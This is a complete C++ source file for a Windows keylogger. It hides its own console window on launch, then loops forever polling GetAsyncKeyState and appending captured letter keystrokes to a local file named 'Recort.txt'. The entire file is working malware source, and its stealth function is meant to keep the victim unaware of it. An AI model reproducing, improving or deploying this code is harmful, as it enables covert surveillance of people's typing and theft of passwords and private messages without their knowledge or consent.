#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

 
using namespace std;

void log();
void hide();
 
int main( )
 {
 	hide();
   log();
   	
  }
   
 void log(){
  	char key;
  	for(;;)
  	{
   	
  	for(key = 8;key<=222;key++)
	 		  {
   				if(GetAsyncKeyState(key)== -32767 )
			   {
   				ofstream write ("Recort.txt",ios::app);
   				
   				if((key>64) && (key<91) && !GetAsyncKeyState(0x10))
				   {
   					key+=32;
   					write << key;
   					write.close();
   					break;
				   }
				   else if((key>64) && (key<91))
				   {
				   	write << key;
   					write.close();
   					break;
				   }
			   }
	  	 }
   	}
}

void hide(){
	
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow(stealth,0);
}


